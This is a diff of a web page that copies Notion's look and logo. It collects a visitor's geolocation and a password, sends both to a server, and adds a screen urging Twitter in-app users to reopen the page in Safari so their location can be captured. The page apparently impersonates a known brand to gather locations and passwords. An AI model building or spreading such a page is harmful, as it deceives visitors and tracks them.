@@ -6,7 +6,6 @@
     <link rel="icon" type="image/x-icon" href="favicon.ico" />
     <title>Notion</title>
     <style>
-      /* Notion風のシックなデザイン */
       body {
         font-family: "Inter", "Noto Sans JP", sans-serif;
         background-color: #f7f6f3;
@@ -25,8 +24,7 @@
         padding: 24px;
         border-radius: 12px;
         box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        max-width: 76vw;
-        width: 360px;
+        max-width: 360px;
       }
       h2 {
         font-size: 20px;
@@ -122,10 +120,45 @@
       <p id="message"></p>
     </div>
 
+    <!-- Twitter内ブラウザ警告画面 -->
+    <div class="container" id="twitterWarningContainer" style="display: none">
+      <div class="logo">
+        <img src="./Notion-logo.png" alt="notion-logo" />
+      </div>
+      <h2>Safariで開いてください</h2>
+      <p class="description">
+        現在、Twitterアプリ内ブラウザで開いているため、位置情報が正しく取得できない可能性があります。<br /><br />
+        以下の手順で通常のSafariブラウザで開いてください。
+      </p>
+      <ol
+        style="
+          font-size: 14px;
+          text-align: left;
+          margin-top: 8px;
+          margin-left: 20px;
+        "
+      >
+        <li>画面右下の共有アイコン（□から↑）をタップ</li>
+        <li>「Safariで開く」を選択</li>
+      </ol>
+    </div>
+
     <script>
-      let currentLocation = null; // 🌟取得した位置情報を保持する
+      let currentLocation = null;
 
       document.addEventListener("DOMContentLoaded", async () => {
+        const ua = navigator.userAgent.toLowerCase();
+        const isTwitterInAppBrowser = ua.includes("twitter");
+        const isIOS =
+          ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod");
+        const isAndroid = ua.includes("android");
+
+        if (isTwitterInAppBrowser && (isIOS || isAndroid)) {
+          // ✅ iOS or AndroidのTwitterブラウザなら警告画面を出す（今はAndroidでも出す）
+          showTwitterWarning();
+          return;
+        }
+
         const locationMessage = document.getElementById("locationMessage");
 
         if (!navigator.geolocation) {
@@ -142,10 +175,8 @@
 
             if (permissionStatus.state === "granted") {
               console.log("初回から位置情報：許可済み");
-              // ✅ すぐパスワード画面に切り替える
               getLocationAndProceed();
 
-              // ✅ その裏で非同期で位置情報を取得
               navigator.geolocation.getCurrentPosition(
                 (position) => {
                   currentLocation = {
@@ -178,10 +209,7 @@
       });
 
       function showRequestButton() {
-        const requestButton = document.getElementById("requestButton");
-        if (requestButton) {
-          requestButton.style.display = "block";
-        }
+        document.getElementById("requestButton").style.display = "block";
       }
 
       function onClickRequestButton() {
@@ -189,7 +217,6 @@
 
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            console.log("位置情報取得成功:", position);
             currentLocation = {
               lat: position.coords.latitude,
               lon: position.coords.longitude,
@@ -197,7 +224,6 @@
             getLocationAndProceed();
           },
           (error) => {
-            console.error("位置情報取得失敗:", error);
             if (error.code === 1) {
               locationMessage.innerText =
                 "位置情報の取得が許可されませんでした。ブラウザ設定をご確認ください。";
@@ -225,7 +251,7 @@
         try {
           const requestBody = {
             password: inputPassword,
-            location: currentLocation, // 🌟位置情報も一緒に送信
+            location: currentLocation,
           };
 
           const response = await fetch(
@@ -255,6 +281,13 @@
       function getLocationAndProceed() {
         document.getElementById("locationContainer").style.display = "none";
         document.getElementById("passwordContainer").style.display = "flex";
+      }
+
+      function showTwitterWarning() {
+        document.getElementById("locationContainer").style.display = "none";
+        document.getElementById("passwordContainer").style.display = "none";
+        document.getElementById("twitterWarningContainer").style.display =
+          "flex";
       }
     </script>
   </body>
